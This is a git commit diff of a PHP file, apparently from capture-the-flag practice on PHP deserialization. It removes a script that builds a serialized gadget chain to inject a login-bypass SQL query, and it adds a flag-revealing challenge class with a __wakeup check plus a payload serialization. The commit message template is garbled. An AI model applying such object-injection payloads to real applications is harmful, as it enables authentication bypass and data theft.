39e9e513663fa547ecfd61ce682d9a33cfc4c81d
whb54012 <1226844928@qq.com>
2026-08-22 12:07:14 +0000

    自动提交：更新 ${2026/8/22 20:07ilenPM7e}

--- 1.php
+++ 1.php
@@ -1,75 +1,43 @@
 <?php
-class Info{
-    public $age;
-    public $nickname;
-    public $CtrlCase;
-    public function __construct($age,$nickname){
-        $this->age=$age;
-        $this->nickname=$nickname;
-    }   
-}
-Class UpdateHelper{
-    public $id;
-    public $newinfo;
-    public $sql;
-    public function __construct($newInfo,$sql){
-        $newInfo=unserialize($newInfo);
-        $upDate=new dbCtrl();
+include 'flag.php';
+
+
+error_reporting(0);
+
+
+class Name{
+    private $username = 'admin';
+    private $password = '100';
+
+    public function __construct($username,$password){
+        $this->username = $username;
+        $this->password = $password;
     }
-    public function __destruct()
-    {
-        echo $this->sql;
+
+    function __wakeup(){
+        $this->username = 'guest';
     }
-}
-class dbCtrl
-{
-    public $hostname="127.0.0.1";
-    public $dbuser="noob123";
-    public $dbpass="noob123";
-    public $database="noob123";
-    public $name;
-    public $password;
-    public $mysqli;
-    public $token;
-    public function __construct()
-    {
-        $this->name=$_POST['username'];
-        $this->password=$_POST['password'];
-        $this->token=$_SESSION['token'];
-    }
-    public function login($sql)
-    {
-        $this->mysqli=new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database);
-        if ($this->mysqli->connect_error) {
-+
-            die("连接失败，错误:" . $this->mysqli->connect_error);
+
+    function __destruct(){
+        if ($this->password != 100) {
+            echo "</br>NO!!!hacker!!!</br>";
+            echo "You name is: ";
+            echo $this->username;echo "</br>";
+            echo "You password is: ";
+            echo $this->password;echo "</br>";
+            die();
         }
-        $result=$this->mysqli->prepare($sql);
-        $result->bind_param('s', $this->name);
-        $result->execute();
-        $result->bind_result($idResult, $passwordResult);
-        $result->fetch();
-        $result->close();
-        if ($this->token=='admin') {
-            return $idResult;
+        if ($this->username === 'admin') {
+            global $flag;
+            echo $flag;
+        }else{
+            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
+            die();
+
+            
         }
     }
 }
-class User
-{
-    public $id;
-    public $age=null;
-    public $nickname=null;
-}
-$Helper=new UpdateHelper(1,1);
-$sql=new user();
-$sql->age='select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?';
-$nickname=new info(1,1);
-$CtrlCase=new dbCtrl();
-$CtrlCase->name='admin';
-$CtrlCase->password='1';
-$nickname->CtrlCase=$CtrlCase;
-$sql->nickname=$nickname;
-$Helper->sql=$sql;
-print(serialize($Helper));
+$a=new Name('admin',100);
+echo serialize($a)
 ?>
